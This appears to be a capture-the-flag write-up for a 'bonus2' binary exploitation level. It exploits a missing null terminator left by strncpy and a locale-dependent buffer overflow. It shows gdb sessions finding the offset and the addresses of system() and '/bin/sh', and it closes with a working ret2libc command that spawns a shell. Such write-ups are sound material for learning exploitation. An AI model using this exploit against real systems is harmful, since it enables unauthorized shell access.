We start by opening the file in [dogbolt](https://dogbolt.org/).
Here we see that we will use the fact `strncpy` don't put `\0` in some case.

Here we will overflow using the same method as in the bonus0.
We see that 40 char form `argv[1]` is copied by a `strncpy`
And 32 char is copied from `argv[2]`

So we will try to make the program copy `argv[1]` and `argv[2]` in the first `strncpy`:
[ARGV 1][ARGV 2][ARGV2]

We find the offset to overflow :

```
(gdb) set env LANG=fi
(gdb) r 12345678901234567890123456789012345678gtg90 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/bonus2/bonus2 12345678901234567890123456789012345678gtg90 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Hyvää päivää 12345678901234567890123456789012345678gtAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
```

This give us the offset : 18

Since we have more than 12 bytes we can try to use a Ret 2 libc.
A Ret 2 libc is compose of :
[Address of system][return address of system][command to execute]

address of system:

```
(gdb) start
Temporary breakpoint 1 at 0x804852f
Starting program: /home/user/bonus2/bonus2

Temporary breakpoint 1, 0x0804852f in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

address : `0xb7e6b060`
in little endian : `\x60\xb0\xe6\xb7`

Now we search the address of `"/bin/sh"` in the libc:

```
(gdb) i proc map
process 2785
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/bonus2/bonus2
         0x8049000  0x804a000     0x1000        0x0 /home/user/bonus2/bonus2
        0xb7e2b000 0xb7e2c000     0x1000        0x0
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0
        0xb7fdb000 0xb7fdd000     0x2000        0x0
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
(gdb) find 0xb7e2c000, 0xb7fcefff, "/bin/sh"
0xb7f8cc58
```

address : `0xb7f8cc58`
in little endian : `\x58\xcc\xf8\xb7`

First arg: Second arg :
[Fill the first ARG]|[Offset to overflow][Ret 2 libc]

```Shell
export LANG=fi
./bonus2 $(python -c 'print "A"* 40') $(python -c 'print "\x90" * 18 + "\x60\xb0\xe6\xb7" + "ABCD" + "\x58\xcc\xf8\xb7"')
```
